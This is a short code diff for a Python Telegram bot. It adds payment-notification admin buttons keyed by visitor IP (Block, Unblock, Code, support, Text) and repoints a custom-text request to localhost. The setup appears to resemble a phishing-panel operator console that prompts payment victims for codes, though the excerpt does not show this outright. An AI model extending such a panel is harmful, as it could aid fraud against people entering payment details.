@@ -1081,13 +1081,12 @@ async def payment_notify(request):
             InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
             InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
             InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
-        ]
-    ]
-    if user_id:
-        kb_rows.append([
+        ],
+        [
             InlineKeyboardButton(text="Тех підтримка", callback_data=f"support:{ip}"),
             InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
-        ])
+        ]
+    ]
     kb = InlineKeyboardMarkup(inline_keyboard=kb_rows)
     await bot.send_message(ADMIN_GROUP_ID, text, reply_markup=kb)
     return web.Response(text='ok')
@@ -1190,7 +1189,7 @@ async def admin_enter_text(message: types.Message):
     ip = step.replace("text_for_", "")
     text = message.text
     text_id = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
-    requests.post('https://artpullse.com/set_custom_text', json={'text_id': text_id, 'text': text})
+    requests.post('http://127.0.0.1:8080/set_custom_text', json={'text_id': text_id, 'text': text})
     import aiohttp
     async def set_flag():
         async with aiohttp.ClientSession() as session:
